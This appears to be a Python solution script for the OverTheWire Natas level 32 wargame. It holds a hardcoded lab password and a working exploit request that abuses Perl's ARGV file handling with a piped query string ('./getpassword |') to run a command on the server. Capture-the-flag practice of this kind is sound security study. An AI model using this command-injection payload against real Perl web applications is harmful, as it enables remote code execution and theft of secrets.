import requests
from requests.auth import HTTPBasicAuth

url = "http://natas32.natas.labs.overthewire.org/index.pl"
auth = HTTPBasicAuth("natas32", "Rc3837d6qd3KoW0R2IgKssMXRX06btgY")

# create a session object to maintain cookies and authentication between requests
session = requests.Session()
session.auth = auth

files = {"file": ("test.csv")}

data = [("file", "ARGV")]

response = requests.post("http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20%7C", auth=auth,  data=data, files=files)

print(response.text)